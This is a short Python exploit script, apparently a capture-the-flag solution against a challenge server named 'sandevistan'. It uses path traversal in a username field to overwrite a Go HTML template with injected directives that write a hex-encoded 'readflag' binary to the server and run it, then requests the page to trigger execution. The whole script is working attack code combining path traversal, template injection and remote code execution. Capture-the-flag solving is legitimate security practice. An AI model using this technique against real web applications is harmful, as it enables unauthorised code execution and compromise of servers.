import requests

def binary_to_hex_string(binary_data):
    hex_string = ''.join(f'\\x{byte:02x}' for byte in binary_data)
    return hex_string

binary_data = open("readflag","rb").read()  
hex_representation = binary_to_hex_string(binary_data)

# url = "http://localhost:7777" 
url = "http://sandevistan.chal.perfect.blue:28945"

r = requests.post(
    f"{url}/user", 
    data={
        "username": "asdf",
    }
)
print(r.status_code)
print(r.text)

r = requests.post(
    f"{url}/cyberware", 
    data={
        "username": "../../../../../../../app/tmpl/user.html", # 경로
        "name": b"""
<!DOCTYPE html>
    <head>
        <link rel="stylesheet" href="static/css/style.css">
        <!-- cool cyberpunk theme from gwannon: https://github.com/gwannon/Cyberpunk-2077-theme-css -->
    </head>
    <body>
        <h2 class="cyberpunk glitched">Hello {{.Name}}!</h1>
        <h3 class="cyberpunk glitched">Here are your cyberwares.</h2>
        <hr />

        <div class="cyberwares">
            {{.NewError "xxxxx" "/bin/true"}}
            {{.SerializeErrors \""""+ hex_representation.encode() +b"""\" 0 0}}
            {{.UserHealthcheck}}
        </div>

    </body>
</html>
"""# 내용
    }
)
print(r.status_code)
print(r.text)

r = requests.get(
    f"{url}/user", 
    params={
        "username": "asdf",
    }
)
print(r.status_code)
print(r.text)